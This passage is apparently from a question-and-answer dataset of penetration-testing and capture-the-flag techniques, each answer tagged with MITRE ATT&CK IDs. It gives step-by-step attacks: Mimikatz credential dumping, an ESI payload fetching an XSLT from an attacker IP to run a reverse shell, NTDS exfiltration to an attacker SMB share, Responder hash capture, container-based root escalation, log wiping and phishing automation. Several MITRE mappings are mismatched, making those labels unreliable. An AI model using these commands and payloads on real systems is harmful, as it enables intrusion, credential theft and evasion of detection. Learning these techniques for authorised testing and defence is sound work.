A: To extract the clear text password and NTLM hash for the domain administrator 'beccy', we can use the Mimikatz tool. After downloading the latest version of Mimikatz from the official GitHub repository (https://github.com/gentilkiwi/mimikatz/releases) and serving it on our Kali machine, we can download and launch Mimikatz on the MAILSRV1 system. Once Mimikatz is running, we can use the 'privilege::debug' command to obtain the necessary privileges, and then use the 'sekurlsa::logonpasswords' command to extract the credentials for the 'beccy' user. We can then store the clear text password and NTLM hash in a 'creds.txt' file on our Kali system. MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: Credential Access.

## Q: What technique can be used to obtain a command line shell on a domain controller with domain admin privileges?
A: The impacket-psexec tool can be used to obtain an interactive shell on a domain controller with domain admin privileges by leveraging the NTLM hash of a privileged user account. This allows an attacker to execute commands with the highest level of access on the target system. MITRE References: MITRE ID is T1021.002, MITRE Name is: Remote Services: SMB/Windows Admin Shares, and MITRE Tactics are: Lateral Movement.

## Q: How can you use SSH password spraying to gain access to a target system?
A: SSH password spraying involves using a list of common passwords to attempt to brute force access to an SSH server. To perform SSH password spraying, you can use the Metasploit auxiliary module 'auxiliary/scanner/ssh/ssh_login'. Set the RHOSTS, USER_FILE, and PASS_FILE options to the target IP address, a list of usernames, and a list of passwords respectively, then run the module. If a valid username and password combination is found, you will gain access to the system. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can an attacker bypass a file upload whitelist validation to execute arbitrary code?
A: To bypass a file upload whitelist validation, an attacker can try to upload a file with multiple extensions, where one of the extensions is associated with a file handler that can execute the file as code. For example, an attacker could try to upload a file named 'webshell.php.jpg' where the '.php' extension is mapped to the PHP handler, allowing the file to be executed as PHP code despite the '.jpg' extension. The attacker can also try to add magic bytes to the file to mimic a valid file type that is allowed by the whitelist. MITRE References: MITRE ID is T1189, MITRE Name is: Execution through Module Load, and MITRE Tactics are: Execution.

## Q: How can we exploit Edge Side Includes (ESI) injection vulnerabilities?
A: To exploit ESI injection vulnerabilities, we can craft a payload that loads a malicious XSLT stylesheet from our controlled server. The payload can look like this:<esi:include src="http://example.com/" stylesheet="http://10.10.14.4/esi.xsl"> </esi:include>This payload will load the stylesheet from our server (http://10.10.14.4/esi.xsl) and apply it to the data from example.com. We can then craft the XSLT stylesheet to execute arbitrary commands on the server, such as downloading a reverse shell and executing it. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: TA0007.

## Q: How can we leverage weak file permissions to move laterally on a Linux machine?
A: To leverage weak file permissions to move laterally on a Linux machine, we can look for world-writable files or directories that are owned by a different user. We can then create a symlink from that file or directory to a sensitive file, such as the target user's SSH key. This will allow us to access the sensitive file and potentially gain access to the target user's account. For example, if we find a world-writable directory owned by the srvadm user, we can create a symlink from that directory to the srvadm user's .ssh/id_rsa file, and then use the SSH key to log in as the srvadm user. MITRE References: MITRE ID is T1222, MITRE Name is: File and Directory Permissions Modification, and MITRE Tactics are: TA0005.

## Q: How can we use password hashing techniques to crack weak passwords?
A: To crack weak passwords using password hashing techniques, we can:1. Obtain the hashed password, either from a database or a configuration file.2. Implement a script to recreate the hashing algorithm used, such as MD5(crypt(password, salt)).3. Use a wordlist (e.g., rockyou.txt) to try each word and compare the hash to the target hash.4. If a match is found, the original password has been cracked.This approach can be effective against weak hashing algorithms and passwords that can be found in common wordlists. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: TA0006.

## Q: How can we leverage plaintext credentials found in configuration files to escalate privileges on a Linux machine?
A: To leverage plaintext credentials found in configuration files to escalate privileges, we can:1. Identify any configuration files that may contain plaintext credentials, such as database connection strings or service account credentials.2. Extract the credentials from the configuration file and try using them to log in to the corresponding service or account.3. If the credentials are valid, we can potentially use the elevated privileges to move laterally or escalate to root access on the system. MITRE References: MITRE ID is T1552, MITRE Name is: Unsecured Credentials, and MITRE Tactics are: TA0006.

## Q: What are some common techniques used in CTF challenges to bypass security controls?
A: Common CTF techniques include: 1) Using input validation vulnerabilities to inject malicious payloads. 2) Leveraging misconfigured services or permissions to escalate privileges. 3) Discovering and exploiting software vulnerabilities like buffer overflows. 4) Conducting social engineering attacks to obtain sensitive information. 5) Bypassing authentication mechanisms through credential stuffing or other methods. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: What is a common method for gaining initial access to a target system?
A: One common method for gaining initial access to a target system is to exploit a vulnerability in a running service. This can be done by using a tool like Metasploit to search for and deploy appropriate exploits. Another approach is to attempt to brute-force or guess weak credentials for services like SSH, FTP, or web applications. MITRE References: MITRE ID is T1210, MITRE Name is: Exploitation of Remote Services, and MITRE Tactics are: Initial Access.

## Q: How can you escalate privileges on a compromised system?
A: There are a few common techniques for privilege escalation on a compromised system. First, you can check for known local privilege escalation vulnerabilities using tools like `LinEnum` or `LinPEAS`. You can also attempt to abuse misconfigurations or weaknesses in running services or processes to gain higher levels of access. Finally, you can try to guess or crack weak passwords for more privileged user accounts. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Privilege Escalation.

## Q: How can you cover your tracks after compromising a system?
A: To cover your tracks after compromising a system, you can take several steps:1. Clear or modify log files to remove evidence of your activity. 2. Uninstall or disable any backdoors or remote access tools you've installed.3. Ensure that any credentials or exploits used are no longer functional.4. Consider using tools like `srm` to securely delete any files or artifacts left behind.5. Finally, be sure to properly close any connections or sessions you've established. MITRE References: MITRE ID is T1070, MITRE Name is: Indicator Removal on Host, and MITRE Tactics are: Defense Evasion.

## Q: How can we exploit the SQL injection vulnerability in the vulnerable OpenEMR instance?
A: To exploit the SQL injection vulnerability in the vulnerable OpenEMR instance, we can use the sqlmap tool. First, we need to capture the vulnerable HTTP request in a file, for example 'req':http://hms.htb/portal/add_edit_event_user.php?eid=1Then, we can run sqlmap against this file with the following parameters:sqlmap -r req --batch --dbsThis will enumerate the databases available on the target system. Once we have identified the 'openemr' database, we can dump the contents of the 'users_secure' table to retrieve the hashed password for the 'openemr_admin' user:sqlmap -r req --batch -D openemr -T users_secure -C username,password --dump MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can we crack the bcrypt hashed password for the 'openemr_admin' user?
A: To crack the bcrypt hashed password for the 'openemr_admin' user, we can use John the Ripper. First, we need to copy the hash into a file, for example 'hash':$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.Then, we can run John the Ripper against this hash using the bcrypt format and the rockyou.txt wordlist:john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hashThis will attempt to crack the bcrypt hash and reveal the plaintext password, which in this case is 'xxxxxx'. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can we achieve remote command execution on the vulnerable OpenEMR instance?
A: There are multiple ways to achieve remote command execution on the vulnerable OpenEMR instance:1. Exploiting the file upload vulnerability in the 'super/manage_site_files.php' script:   - Upload a PHP webshell to the 'sites/default/images/' directory   - Access the webshell at 'http://hms.htb/sites/default/images/webshell.php?0=whoami'2. Exploiting the remote code execution vulnerability in the 'import_template.php' and 'edit_globals.php' scripts:   - Use the Exploit-DB scripts 48515 and 45161 to achieve remote command executionAfter gaining a shell as the 'www-data' user, you can further escalate privileges to gain access to the system. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access, Execution.

## Q: How can we escalate privileges from the 'www-data' user to the 'root' user?
A: To escalate privileges from the 'www-data' user to the 'root' user, we can exploit the fact that the 'luffy' user is a member of the 'docker' group. This allows us to run commands as 'root' without knowing the root password, as the 'docker' group runs with the SUID bit.First, we need to switch to the 'luffy' user using the credentials we found earlier:su luffyThen, we can create a new Docker container and mount the root directory of the host inside the container using the following command:docker run -v /:/mnt --rm -it ubuntu chroot /mnt shThis will allow us to execute commands on the host system as 'root'. We can then change the password for the 'root' user using the 'passwd' command and switch to the 'root' user.su root MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you use Gopherus to exploit an SSRF vulnerability and poison a memcached cache?
A: To use Gopherus to exploit an SSRF vulnerability and poison a memcached cache, you can follow these steps:

1. Clone the Gopherus repository: git clone https://github.com/tarunkant/Gopherus
2. Change to the Gopherus directory and run the install script: cd Gopherus && bash install.sh
3. Select the 'phpmemcache' option to generate a PHP serialized payload to poison the memcached cache.
4. Craft a URL that includes the generated payload and the SSRF vector to set the malicious key-value pair in memcached.
5. Submit the URL to the vulnerable application to trigger the SSRF and deserialization vulnerabilities. MITRE References: MITRE ID is T1218, MITRE Name is: System Binary Proxy Execution, and MITRE Tactics are: Execution.

## Q: How can you identify and abuse a Gogs Git server during a penetration test?
A: Gogs is a self-hosted Git service that can be vulnerable to various issues. During a pentest, you can enumerate the Gogs server by looking for the default port (usually 3000) and try to register a user account. You can also try to find any exposed Git repositories and use git-dumper or similar tools to download the code. Examine the code for any sensitive information like credentials, API keys or other weaknesses. You can also try to abuse any vulnerabilities in the Gogs application itself to gain further access. MITRE References: MITRE ID is T1213, MITRE Name is: Data from Information Repositories, and MITRE Tactics are: TA0009.

## Q: Explain how you can create and upload a malicious Spigot/Bukkit plugin to a Minecraft server to execute arbitrary code.
A: Spigot and Bukkit are popular Minecraft server implementations that allow the use of plugins to extend the server's functionality. During a pentest, you can identify if a Minecraft server is running one of these frameworks and try to create a malicious plugin to execute arbitrary commands. First, you can set up a development environment with tools like IntelliJ IDEA or Maven, and create a new plugin project. Then, modify the plugin code to execute system commands, for example by using the ProcessBuilder class in Java. Finally, build the plugin artifact and upload it to the server, often through a web interface provided by a plugin management tool like PlugMan. This allows you to execute commands in the context of the Minecraft server process. MITRE References: MITRE ID is T1569, MITRE Name is: System Services, and MITRE Tactics are: TA0004.

## Q: How can you use AMQP (Advanced Message Queuing Protocol) to publish and execute a malicious Cuberite plugin on a Minecraft server?
A: AMQP is a message queuing protocol used by services like RabbitMQ. In a pentest scenario, you can identify if a Minecraft server is using the Cuberite framework, which supports plugins written in Lua. By analyzing network traffic, you may find that Cuberite is subscribed to an AMQP exchange to receive plugin updates. You can then create a malicious Lua plugin, host it on a web server, and use the AMQP credentials (often found in configuration files or network captures) to publish the plugin URL to the exchange. This will cause the Cuberite server to fetch and execute the malicious plugin, potentially giving you code execution as the root user. MITRE References: MITRE ID is T1568, MITRE Name is: Dynamic Resolution, and MITRE Tactics are: TA0011.

## Q: How can the Bludit CMS brute force protection be bypassed?
A: The Bludit CMS 3.9.2 has a vulnerability that allows bypassing the brute force protection (CVE-2019-16113). This can be done by sending the password in the X-Forwarded-For header instead of the password field, allowing an attacker to perform a dictionary attack without triggering the protection. MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can a user gain root privileges on a system running an outdated version of the sudo binary?
A: The sudo binary in version 1.8.25p1 contains a vulnerability (CVE-2019-14287) that allows a user to run commands as root, even if the configuration explicitly disallows this. This can be exploited by a user with sudo rights to run /bin/bash as root and gain full system access. MITRE References: MITRE ID is T1068, MITRE Name is: Exploitation for Privilege Escalation, and MITRE Tactics are: Privilege Escalation.

## Q: How can one enumerate users through SMB shares and use Kerberos pre-authentication disabled to conduct an ASREPRoasting attack?
A: To enumerate users through SMB shares and conduct an ASREPRoasting attack:1. Use smbmap to check for accessible SMB shares: smbmap -u guest -H 10.10.10.1922. Inspect the 'profiles$' share and generate a list of usernames using smbclient: smbclient -N \\10.10.10.192\profiles$ -c ls | awk '{ print $1 }' > users.txt3. Use Impacket's GetNPUsers.py to check for users with Kerberos pre-authentication disabled: GetNPUsers.py blackfield.local/ -no-pass -usersfile users.txt -dc-ip 10.10.10.192 | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'4. Save the hash of the vulnerable user to a file (e.g. 'hash') and crack it using John the Ripper: john hash --format=krb5asrep MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: TA0006.

## Q: How can one leverage the Backup Operators group membership to dump the Active Directory database and retrieve the domain administrator hash?
A: To leverage Backup Operators group membership to dump the AD database:1. Use evil-winrm to gain a PowerShell session as the 'svc_backup' user: evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d2. Set up a Samba server for authentication: modify /etc/samba/smb.conf, create the 'smbuser' account, and start the SMB service3. In the PowerShell session, mount the Samba share: net use k: \10.10.14.3\smb /user:smbuser smbpass4. Use wbadmin to backup the NTDS folder to the mounted Samba share: echo "Y" | wbadmin start backup -backuptarget:\10.10.14.3\smb -include:c:\windows\ntds5. Extract the NTDS.dit and SYSTEM hive files, and use Impacket's secretsdump.py to dump the hashes: secretsdump.py -ntds NTDS.dit -system system.hive LOCAL MITRE References: MITRE ID is T1003, MITRE Name is: OS Credential Dumping, and MITRE Tactics are: TA0006.

## Q: How can you use the SeLoadDriver privilege to escalate privileges on a Windows Server 2016 system?
A: To escalate privileges using the SeLoadDriver privilege on a Windows Server 2016 system, you can follow these steps:1. Ensure that Windows Defender is not enabled on the machine, as it may interfere with loading a vulnerable driver.2. Download and modify the Metasploit Capcom exploit module (capcom_sys_exec.rb) to comment out the check_result section.3. Set up a Metasploit multi/handler to receive a reverse Meterpreter session.4. Generate a 64-bit Meterpreter reverse TCP payload using msfvenom.5. Transfer the payload to the target system and execute it using PowerShell.6. Download and compile the eoploaddriver.cpp code to install the vulnerable Capcom driver.7. Use the eoploaddriver.exe tool to load the Capcom.sys driver on the target system.8. Run the Metasploit Capcom exploit module, which will now be able to leverage the loaded driver to escalate privileges to SYSTEM.This exploit takes advantage of a vulnerability in the Capcom driver, which can be used to execute arbitrary code in the kernel, allowing for privilege escalation. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you leverage a Tomcat manager application to deploy a webshell and gain remote code execution?
A: To leverage a Tomcat manager application to deploy a webshell and gain remote code execution, you can follow these steps:1. Identify the Tomcat manager application's location, typically at /manager/text.2. Obtain valid credentials for the Tomcat manager application, either through default credentials, LFI, or other means.3. Create a simple JSP webshell and package it into a .war file.4. Use the Tomcat manager application's text interface to deploy the .war file, setting the path to /webshell or a similar name.5. Access the deployed webshell, typically at http://target/webshell/cmd.jsp, and execute commands on the remote system.6. Establish a reverse shell to gain interactive access to the system. MITRE References: MITRE ID is T1505, MITRE Name is: Server Software Component, and MITRE Tactics are: Persistence, Privilege Escalation.

## Q: How can you leverage the LXD group to escalate privileges on a Linux system?
A: To leverage the LXD group to escalate privileges on a Linux system, you can follow these steps:1. Identify if the target user is a member of the LXD group, which grants the ability to create and manage LXC containers.2. Download and build an Alpine Linux container image on your local machine.3. Transfer the Alpine Linux container image to the target system.4. Use the lxd init command to initialize the LXD service on the target system.5. Import the Alpine Linux container image using the lxc image import command.6. Create a privileged LXC container using the lxc init command, specifying the security.privileged=true option.7. Add a disk device to the container, mounting the host's root filesystem using the lxc config device add command.8. Start the privileged container using the lxc start command.9. Access the privileged container using the lxc exec command and gain root-level access to the host system. MITRE References: MITRE ID is T1548, MITRE Name is: Abuse Elevation Control Mechanism, and MITRE Tactics are: Privilege Escalation.

## Q: How can you exploit a file upload vulnerability on a web application?
A: To exploit a file upload vulnerability, the key steps are: 1) Identify the location where uploaded files are stored, 2) Craft a malicious file (e.g. PHP webshell) and upload it, 3) Execute the malicious file by navigating to its location on the web server. This can allow you to gain remote code execution on the server. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: What is the purpose of the V8 engine and how can it be exploited?
A: The V8 engine is an open-source JavaScript engine that powers applications like Google Chrome. It can be exploited through vulnerabilities like out-of-bounds (OOB) read/write in built-in array functions to achieve type confusion and memory corruption. This can lead to remote code execution (RCE) by leaking pointers and writing shellcode. Exploit development techniques like addrof and fakeobj primitives can be used to achieve arbitrary read/write and gain control of the execution flow. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution.

## Q: Explain how a vulnerable Linux kernel module can be exploited to gain root privileges.
A: Linux kernel modules that have vulnerabilities like out-of-bounds (OOB) memory access, use-after-free, or improper input validation can be leveraged to achieve privilege escalation. Techniques like leaking kernel addresses to bypass KASLR, constructing fake kernel objects, and utilizing ROP to hijack the control flow can be used to execute malicious code in the kernel context and obtain root privileges. MITRE References: MITRE ID is T1068, MITRE Name is: Exploitation for Privilege Escalation, and MITRE Tactics are: Privilege Escalation.

## Q: How can Python/Bash Scripting be used to perform phishing attacks on a target organization?
A: Python and Bash scripting can be used to automate the phishing process, such as sending targeted emails with malicious links to a list of email addresses. For example, a Python script can be used to host a fake login page, capture submitted credentials, and forward the user to the legitimate site. The script can also be used to send emails to the target organization's employees using a spoofed sender address and enticing message. Bash scripts can be leveraged to automate the repetitive tasks of enumerating email addresses, generating and sending the phishing emails, and analyzing the captured credentials. MITRE References: MITRE ID is T1566, MITRE Name is: Phishing, and MITRE Tactics are: Initial Access.

## Q: How can the PyPI (Python Package Index) server be exploited to achieve lateral movement on a target system?
A: The PyPI server can be exploited by uploading a malicious Python package that gets installed by a low-privileged user. This can be done by creating a custom Python package with a setup.py file that performs privileged actions, such as writing a backdoor to the authorized_keys file. The package can then be uploaded to the PyPI server using the attacker's credentials, and the low-privileged user will install the package, granting the attacker elevated access. MITRE References: MITRE ID is T1053, MITRE Name is: Scheduled Task/Job, and MITRE Tactics are: Execution, Persistence, Privilege Escalation.

## Q: How can the sudo privileges assigned to the low user be leveraged to obtain root access on the target system?
A: The low user has been assigned sudo privileges to run the pip3 command as root. This can be exploited by creating a malicious Python package and uploading it to the PyPI server. When the low user installs the package using pip3, it will be executed with root privileges, allowing the attacker to gain a root shell on the system. This can be done by modifying the setup.py file to include a command that writes the attacker's public key to the authorized_keys file of the root user, granting the attacker SSH access as root. MITRE References: MITRE ID is T1548, MITRE Name is: Abuse Elevation Control Mechanism, and MITRE Tactics are: Privilege Escalation.

## Q: How can a buffer overflow vulnerability in the CloudMe 1112 service be exploited to gain remote code execution?
A: The CloudMe 1112 service running on the Buff machine is vulnerable to a buffer overflow exploit. This can be leveraged to achieve remote code execution. First, set up a Chisel SOCKS proxy to access the localhost service. Then use a Python script and Metasploit to generate a malicious payload and send it to the vulnerable service, overwriting the instruction pointer and executing the payload to gain a reverse shell. Careful crafting of the buffer overflow is required to successfully trigger the vulnerability. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: What is the purpose of the LIBGL_DRIVERS_PATH environment variable and how can it be leveraged for privilege escalation on OpenBSD 6.6?
A: The LIBGL_DRIVERS_PATH environment variable is used by the xlock utility on OpenBSD 6.6 to specify the location of OpenGL driver libraries. However, the dlopen function used by xlock does not properly validate the SGID permissions of the libraries specified in LIBGL_DRIVERS_PATH, allowing a local attacker to spawn a shell with the auth group ID (CVE-2019-19520). This can be exploited by compiling a malicious shared library and setting LIBGL_DRIVERS_PATH to the location of this library, then running xlock to gain auth group privileges. MITRE References: MITRE ID is T1574, MITRE Name is: Hijack Execution Flow, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can a race condition in the usage of the sshpass utility be exploited to obtain sensitive credentials?
A: The sshpass utility is used to non-interactively provide a password for SSH authentication. However, it is susceptible to race conditions where the password may be briefly visible in the process command line before being obfuscated. By writing a program that continuously scans the /proc filesystem and dumps the command lines of processes containing 'sshpass', an attacker can potentially capture the password before it is replaced with masking characters. This can then be used to gain unauthorized access to the target system. MITRE References: MITRE ID is T1212, MITRE Name is: Exploitation for Credential Access, and MITRE Tactics are: Credential Access.

## Q: How can a vulnerability in an outdated Apache Solr instance be exploited to gain a foothold on a target system?
A: Apache Solr is a popular open-source search engine based on the Lucene library. Older versions of Solr have been known to contain vulnerabilities that can allow remote code execution (RCE) by unauthenticated users. One such vulnerability, CVE-2019-0192, affects Solr versions 8.2.0 and prior. By sending a crafted request to the /select endpoint with a specially crafted Velocity template, an attacker can execute arbitrary commands on the target system. This can be used to gain an initial foothold and further escalate privileges on the compromised host. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access.

## Q: How can SSH connections be redirected to gain root access on a target system?
A: By leveraging a race condition in the usage of the sshpass utility, an attacker can obtain the password used to access a privileged container. With this access, the attacker can then set up an SSH connection redirection, where all SSH connections to the container are forwarded back to the host system. This allows the attacker to execute a reverse shell script located at /tmp/clear.sh, which will be run by the root user on the host, granting the attacker full control of the system. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation, Lateral Movement.

## Q: How did the challenge require bypassing restrictive write permissions?
A: To bypass the restrictive write permissions, the challenge required the following steps:

1. Since the web directory was not writable, the /tmp directory was used to upload a malicious PHP script (writeup.php).

2. A cron job was discovered that executed a script (/var/www/cronjobs/clearlogs) every minute. This script called another script (/var/www/cmd/logcleared.sh) that did not exist.

3. By creating the /var/www/cmd/logcleared.sh script and making it executable, the malicious PHP script could be executed by the cron job, allowing for privilege escalation to root. MITRE References: MITRE ID is T1078, MITRE Name is: Valid Accounts, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can the privilege escalation be achieved by abusing the Azure DevOps Build Administrators group?
A: By logging into the Azure DevOps portal as a user who is a member of the Build Administrators group, an attacker can create a new build definition that runs PowerShell scripts with system-level privileges. This can be used to execute arbitrary commands, such as creating a new administrator user account, to achieve privilege escalation on the target system. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: TA0005.

## Q: How can Powershell credential files be used to escalate privileges?
A: Powershell credential files, such as `user.txt` and `iot-admin.xml`, can be used to retrieve the stored credentials. This can be done using the Powershell command `$credential = import-clixml -path <file>; $credential.GetNetworkCredential().password`. The `user.txt` file contained the password for the `app` user, while the `iot-admin.xml` file contained the password for the `administrator` user, which can then be used to log into the Windows Device Portal as the administrator. MITRE References: MITRE ID is T1552, MITRE Name is: Unsanitized Credentials, and MITRE Tactics are: Credential Access.

## Q: How can you use chisel to expose a local port on the remote machine to your local machine for further exploitation?
A: You can use chisel to expose a local port on the remote machine to your local machine as follows:1. Download the chisel binary on your local machine: wget https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz2. Extract and make the chisel binary executable: chmod +x chisel_1.7.6_linux_amd643. Start the chisel server on your local machine in reverse mode: ./chisel_1.7.6_linux_amd64 server -p 1234 --reverse4. On the remote machine, download the chisel binary and connect it to your local machine: wget 10.10.14.2/chisel_1.7.6_linux_amd64 && chmod +x chisel_1.7.6_linux_amd64 && ./chisel_1.7.6_linux_amd64 client 10.10.14.2:1234 R:4506:127.0.0.1:45065. This will expose the remote port 4506 to your local machine, allowing you to interact with the service running on that port. MITRE References: MITRE ID is T1105, MITRE Name is: Remote File Copy, and MITRE Tactics are: Lateral Movement.

## Q: How can the user paul's password hash be cracked using John the Ripper?
A: The password hash for the user paul is discovered to be e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd. This hash can be cracked using John the Ripper and the rockyou.txt wordlist. The command to do this is:echo "e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd" > hashjohn hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256This will crack the hash and reveal the password "atlanta1". MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: Credential Access.

## Q: How can the USBCreator D-Bus service vulnerability be exploited to gain root privileges?
A: The USBCreator D-Bus service vulnerability can be exploited to gain root privileges. The service runs in privileged mode and acts on behalf of unprivileged users. By invoking the com.ubuntu.USBCreator.Image method, an attacker can copy arbitrary files without verification of source or destination paths, or password prompts. The following command can be used to copy the root user's SSH private key to the current user's home directory:gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /home/nadav/id_rsa true MITRE References: MITRE ID is T1611, MITRE Name is: Escape to Host, and MITRE Tactics are: Privilege Escalation.

## Q: How can you exploit a Splunk Universal Forwarder vulnerability to gain remote code execution?
A: To exploit a Splunk Universal Forwarder vulnerability for remote code execution, you can use the Splunk Whisperer2 tool. This tool takes advantage of the fact that the Splunk Universal Forwarder includes a management service that listens on port 8089 and allows remote connections by default, without validating the source or the code being executed. The tool can be used with valid credentials to send single commands or scripts to the Universal Forwarder Agents, effectively executing code remotely. The Splunk Whisperer2 tool is available in both Python and PowerShell versions. MITRE References: MITRE ID is T1021, MITRE Name is: Remote Services, and MITRE Tactics are: Lateral Movement.

## Q: How can we use Responder to perform a spear phishing attack and capture Net-NTLMv2 hashes?
A: First, run Responder to listen for NetNTLMv2 authentication attempts: 

sudo responder -I tun0

Next, send a crafted email to the target user from the OWA access that was obtained earlier. This will trigger a NetNTLMv2 authentication attempt that Responder will capture. The hash can then be cracked offline using tools like John the Ripper or Hashcat. MITRE References: MITRE ID is T1566, MITRE Name is: Phishing, and MITRE Tactics are: Initial Access.

## Q: How can we use the Sticky Notes application to find credentials on the target system?
A: The Sticky Notes application stores its notes in a local storage directory. By enumerating the processes and file system, we can locate this directory and extract the contents of the notes, which may contain sensitive information like credentials. Tools like strings and procdump can be used to dump the memory of the Sticky Notes process and search for patterns to find the stored credentials. MITRE References: MITRE ID is T1083, MITRE Name is: File and Directory Discovery, and MITRE Tactics are: Discovery.

## Q: How can you leverage sudo abuse to escalate privileges on a Linux system?
A: To leverage sudo abuse for privilege escalation:1. Identify a user account that can run certain commands as root using 'sudo -l'.2. If the user is required to enter a 2FA code, obtain the user's password and use a tool like 'oathtool' to generate a valid OTP code.3. Use the 'sudo' command to execute privileged commands, such as spawning a root shell by running 'gem open -e "/bin/sh -c /bin/sh" rdoc'. MITRE References: MITRE ID is T1548, MITRE Name is: Abuse Elevation Control Mechanism, and MITRE Tactics are: Privilege Escalation.

## Q: How can a system timer be leveraged to gain privilege escalation on a Linux machine?
A: A system timer that executes a world-writable script can be leveraged to gain privilege escalation on a Linux machine. By modifying the script to execute a payload that copies a setuid root shell binary to a location like /tmp, an attacker can obtain a root shell when the timer executes the malicious script. Techniques like using the `chmod` command to set the setuid bit on a shell binary and then executing it with the `-p` option to preserve the effective UID can be used to gain root access. MITRE References: MITRE ID is T1053, MITRE Name is: Scheduled Task/Job, and MITRE Tactics are: Privilege Escalation, Persistence.

## Q: How can you use RoguePotato to perform a relay attack and escalate privileges to SYSTEM on a Windows machine?
A: To use RoguePotato to perform a relay attack and escalate privileges to SYSTEM on a Windows machine, you'll need to make some modifications to the tool to support IPv6. First, clone the RoguePotato repository and open the IStorageTrigger.cpp file. Increase the length of the remote_ip_mb array from 16 to 48 bytes to accommodate IPv6 addresses. Then, compile the modified binary.

Next, you'll need to set up an RPC server using a patched version of Impacket to negotiate the incoming authentication and capture the NTLMv1 hash. Download Impacket 0.9.21, apply the rpcrelayclientserver.patch, and make some additional modifications to the code to properly parse IPv6 addresses.

Finally, run the RPC server and execute the modified RoguePotato on the target machine. This should successfully negotiate authentication and return the NTLMv1 hash, which you can then use to crack the password and perform a DCSync attack to obtain the domain administrator's NTLM hash. MITRE References: MITRE ID is T1055.012, MITRE Name is: Process Injection: Ptrace System Calls, and MITRE Tactics are: TA0004.

## Q: How can you use Responder and the Windows Defender CLI to capture NTLMv1 hashes and escalate privileges to SYSTEM on a Windows machine?
A: To capture NTLMv1 hashes and escalate privileges to SYSTEM using Responder and the Windows Defender CLI, follow these steps:

1. Edit the Responder.conf file and set the challenge to 1122334455667788, which is required by the crack.sh service.
2. Start Responder in listening mode with the --lm flag to force the use of NTLMv1 protocol:

./Responder.py -I tun0 --lm

3. In the Windows Defender PowerShell session, run the following command to trigger a scan of a file hosted on your machine:

& "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2102.4-0\MpCmdRun.exe" -Scan -ScanType 3 -File \\10.10.14.4\share\file.txt

This will cause the Windows Defender service, running as SYSTEM, to authenticate to your Responder server and capture the NTLMv1 hash.
4. Submit the captured hash to the crack.sh service in the format NTHASH:<hash> to obtain the plaintext password.
5. Use the cracked password to perform a DCSync attack and obtain the domain administrator's NTLM hash. MITRE References: MITRE ID is T1212, MITRE Name is: Exploitation for Privilege Escalation, and MITRE Tactics are: TA0004.

## Q: How can you exploit an arbitrary read file vulnerability in a GitLab instance?
A: To exploit an arbitrary read file vulnerability in a GitLab instance, such as CVE-2020-10977 in versions <= 12.9.0, you can follow these steps:1. Create two new projects in the vulnerable GitLab instance.2. Add an issue to the first project with the following directory traversal in the description: [a] (/uploads/11111111111111111111111111111111/../../../../../../../../<SNIP>/etc/passwd)3. Move the issue to the second project, which will allow you to download the specified file (in this case, /etc/passwd).4. Alternatively, you can use an automated exploit script like cve_2020_10977.py to perform the entire process.Once you have read the /etc/passwd file, you can attempt to gain remote code execution by retrieving the secret_key_base from the /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml file. You can then use this secret_key_base to create a marshalled payload for the experimentation_subject_id cookie, which can be used to execute commands on the server. MITRE References: MITRE ID is CVE-2020-10977, MITRE Name is: Arbitrary File Read, and MITRE Tactics are: TA0009, Collection.

## Q: How can you exploit an XSS (Cross-Site Scripting) vulnerability to gain a foothold on a Windows system?
